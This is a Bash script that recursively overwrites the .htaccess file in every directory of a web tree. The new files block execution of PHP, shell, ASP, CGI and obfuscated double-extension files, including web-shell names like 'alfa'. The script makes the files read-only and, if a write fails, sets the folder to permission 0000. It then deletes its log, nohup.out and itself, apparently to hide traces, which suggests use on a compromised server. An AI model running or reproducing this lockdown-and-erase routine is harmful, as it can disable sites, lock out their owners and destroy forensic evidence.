#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH=$(readlink -f "$0")  # Get the absolute path of the script
NOHUP_FILE="$(dirname "$0")/nohup.out"  # Assume nohup.out is in the same directory as the script

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
HTACCESS_CONTENT=$(cat <<EOF
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.SH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.AS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.As*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.aS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.as*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|htm|html|alfa|htaccess)$"> 
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

DirectoryIndex index.php
Options -Indexes
ErrorDocument 403 "<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br></body></html>"
ErrorDocument 404 "<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br></body></html>" 
ErrorDocument 500 "Maaf, akses Anda ditolak karena mencoba melakukan aktivitas yang mencurigakan."

EOF
)
  echo "$HTACCESS_CONTENT" > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi
}

export -f update_htaccess
find "$TARGET_DIR" -type d -exec bash -c 'update_htaccess "$0"' {} \;
sleep 5

# Remove log file
rm -f "$LOG_FILE"

# Remove nohup.out if it exists
if [ -f "$NOHUP_FILE" ]; then
  rm -f "$NOHUP_FILE"
fi

# Self-delete the script
rm -f "$SCRIPT_PATH"
